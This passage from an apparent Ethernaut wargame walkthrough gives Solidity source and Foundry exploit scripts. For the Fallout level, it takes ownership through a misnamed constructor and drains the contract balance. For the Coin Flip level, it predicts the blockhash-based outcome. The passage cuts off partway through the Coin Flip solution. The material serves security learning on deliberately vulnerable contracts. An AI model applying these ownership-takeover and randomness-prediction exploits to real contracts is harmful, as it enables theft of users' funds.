&lt;&#x2F;span&gt;&lt;span&gt;	        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;require&lt;&#x2F;span&gt;&lt;span&gt;(
&lt;&#x2F;span&gt;&lt;span&gt;	            msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span&gt;owner&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;	            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;caller is not the owner&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;	        )&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;	        _&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;	    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;allocate&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public payable &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    allocations[msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;allocations[msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;add&lt;&#x2F;span&gt;&lt;span&gt;(msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;value)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;sendAllocation&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;address payable allocator&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;require&lt;&#x2F;span&gt;&lt;span&gt;(allocations[allocator] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    allocator&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;transfer&lt;&#x2F;span&gt;&lt;span&gt;(allocations[allocator])&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;collectAllocations&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public onlyOwner &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;transfer&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;this&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;balance)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;allocatorBalance&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;address allocator&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public view returns &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;uint&lt;&#x2F;span&gt;&lt;span&gt;) {
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;allocations[allocator]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ul&gt;
&lt;li&gt;Goal :&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;ol&gt;
&lt;li&gt;Claim the ownership of the contract&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;ul&gt;
&lt;li&gt;Solution&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;ol&gt;
&lt;li&gt;In solidity &lt;code&gt;0.6.0&lt;&#x2F;code&gt; the constructor of the contract is the name of the contract, later it was replaced with &lt;code&gt;constructor&lt;&#x2F;code&gt; keyword.&lt;&#x2F;li&gt;
&lt;li&gt;Here in this contract the constructor sets up the &lt;code&gt;owner&lt;&#x2F;code&gt;.&lt;&#x2F;li&gt;
&lt;li&gt;But the function &lt;code&gt;Fal1out()&lt;&#x2F;code&gt; is not actually a constructor, because its not same as the contract name.&lt;&#x2F;li&gt;
&lt;li&gt;So, we can call this function and claim the ownership.&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;&lt;code&gt;FalloutSolve.s.sol&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;javascript&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-javascript &quot;&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0.6&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;forge-std&#x2F;Script.sol&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;forge-std&#x2F;console.sol&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;{Fallout} &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;..&#x2F;src&#x2F;Fallout.sol&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract FalloutSolve is Script{
&lt;&#x2F;span&gt;&lt;span&gt;    Fallout public level2 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Fallout&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xf66ffe7e1e2663E19fec83F39256cc3Af3513000&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;run&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;external&lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        vm&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;startBroadcast&lt;&#x2F;span&gt;&lt;span&gt;(vm&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;envUint&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;PRIVATE_KEY&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;console&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;log&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Original Owner : &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;level2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;owner&lt;&#x2F;span&gt;&lt;span&gt;())&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        level2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Fal1out&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;console&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;log&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;New Owner : &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;level2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;owner&lt;&#x2F;span&gt;&lt;span&gt;())&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        level2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;collectAllocations&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        vm&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;stopBroadcast&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;To run script :&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt; source .env
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt; forge script script&#x2F;FalloutSolve.s.sol:FalloutSolve&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; --rpc-url &lt;&#x2F;span&gt;&lt;span&gt;$RPC_URL&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; --broadcast
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h1 id=&quot;3-coin-flip&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#3-coin-flip&quot; aria-label=&quot;Anchor link for: 3-coin-flip&quot;&gt;3 Coin Flip&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;code&gt;CoinFlip.sol&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;javascript&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-javascript &quot;&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0.8&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract CoinFlip {
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  uint256 public consecutiveWins&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  uint256 lastHash&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  uint256 FACTOR &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;57896044618658097711785492504343953926634992332820282019728792003956564819968&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;constructor&lt;&#x2F;span&gt;&lt;span&gt;() {
&lt;&#x2F;span&gt;&lt;span&gt;    consecutiveWins &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;flip&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;bool _guess&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public returns &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;bool&lt;&#x2F;span&gt;&lt;span&gt;) {
&lt;&#x2F;span&gt;&lt;span&gt;    uint256 blockValue &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;uint256&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;blockhash&lt;&#x2F;span&gt;&lt;span&gt;(block&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;number &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;- &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;(lastHash &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span&gt;blockValue) {
&lt;&#x2F;span&gt;&lt;span&gt;      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;revert&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    lastHash &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;blockValue&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    uint256 coinFlip &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;blockValue &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&#x2F; &lt;&#x2F;span&gt;&lt;span&gt;FACTOR&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    bool side &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;coinFlip &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;? &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;true &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;false&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;(side &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span&gt;_guess) {
&lt;&#x2F;span&gt;&lt;span&gt;      consecutiveWins&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;++&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;true&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    } &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;else &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;      consecutiveWins &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;false&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ul&gt;
&lt;li&gt;Goal :&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;ol&gt;
&lt;li&gt;We have to make the &lt;code&gt;consecutiveWins&lt;&#x2F;code&gt; to 10. We need to guess the coin flip consecutives 10 times.&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;ul&gt;
&lt;li&gt;Solution :&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;ol&gt;
&lt;li&gt;We can implement the same logic which is used to find the &lt;code&gt;side&lt;&#x2F;code&gt; of the coin in the &lt;code&gt;CoinFlip&lt;&#x2F;code&gt; contract.&lt;&#x2F;li&gt;
&lt;li&gt;Write a new Attack contract which will perform the &lt;code&gt;flip()&lt;&#x2F;code&gt; calculation and sends the value to the &lt;code&gt;CoinFlip&lt;&#x2F;code&gt; contract.&lt;&#x2F;li&gt;
&lt;li&gt;Since the entire computaion at both contracts happens in same transaction, the &lt;code&gt;block.hash&lt;&#x2F;code&gt; and &lt;code&gt;block.number&lt;&#x2F;code&gt; remains same the both contracts.&lt;&#x2F;li&gt;
&lt;li&gt;But we need to run the Attack script 10 times with a small amount of time delay. Because the last blockhash should not be equal to the current blockhash. So, running script at different times will change the block of the transaction.&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;&lt;code&gt;CoinFlipSolve.s.sol&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;javascript&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-javascript &quot;&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0.8&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract CoinFlip {
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  uint256 public consecutiveWins&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  uint256 lastHash&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  uint256 FACTOR &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;57896044618658097711785492504343953926634992332820282019728792003956564819968&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;constructor&lt;&#x2F;span&gt;&lt;span&gt;() {
&lt;&#x2F;span&gt;&lt;span&gt;    consecutiveWins &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;flip&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;bool _guess&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public returns &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;bool&lt;&#x2F;span&gt;&lt;span&gt;) {
